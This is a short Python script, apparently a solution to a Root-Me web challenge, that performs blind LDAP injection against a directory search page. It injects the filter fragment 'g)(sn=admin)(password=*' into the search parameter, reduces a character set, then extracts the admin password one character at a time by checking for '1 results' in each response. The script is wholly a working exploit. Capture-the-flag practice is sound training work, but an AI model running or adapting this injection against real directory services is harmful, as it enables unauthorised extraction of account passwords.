import requests


page_dir = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search='
charset1 = 'abcdefghijklmnopqrstuvwxyz0123456789'
charset2 = ''
payload = 'g)(sn=admin)(password=*'
password = ''

print(f'Charset is {charset1}')
print('Reducing charset...')

for char in charset1:
    response = requests.get(f'{page_dir}{payload}{char}')
    if '1 results' in response.text:
        charset2 += char
        print(char, end='', flush=True)

print(f"\nBruting admin\'s password with charset \'{charset2}\'...")

char_find = True
while char_find:
    char_find = False
    for char in charset2:
        response = requests.get(f'{page_dir}{payload}{char}')
        if '1 results' in response.text:
            char_find = True
            payload += char
            password += char
            print(char, end='', flush=True)

print(f"\nPassword is \'{password}\'")
